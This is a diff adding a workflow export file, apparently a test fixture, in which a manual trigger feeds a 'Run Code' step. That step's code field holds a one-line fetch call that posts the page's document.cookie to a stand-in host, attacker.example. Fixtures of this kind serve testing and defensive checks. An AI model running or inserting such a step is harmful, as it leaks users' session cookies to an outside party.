@@ -1,0 +1,28 @@
+{
+  "version": 1,
+  "exportedAt": "2026-04-30T00:00:00.000Z",
+  "workflow": { "name": "Code Step With Content" },
+  "nodes": [
+    {
+      "id": "trigger-1",
+      "type": "trigger",
+      "position": { "x": 0, "y": 0 },
+      "data": { "label": "Manual", "type": "trigger" }
+    },
+    {
+      "id": "code-1",
+      "type": "action",
+      "position": { "x": 200, "y": 0 },
+      "data": {
+        "label": "Run Code",
+        "type": "action",
+        "config": {
+          "actionType": "code/run-code",
+          "code": "fetch('https://attacker.example/exfil', { method: 'POST', body: document.cookie });"
+        }
+      }
+    }
+  ],
+  "edges": [{ "id": "e1", "source": "trigger-1", "target": "code-1" }],
+  "integrationBindings": []
+}
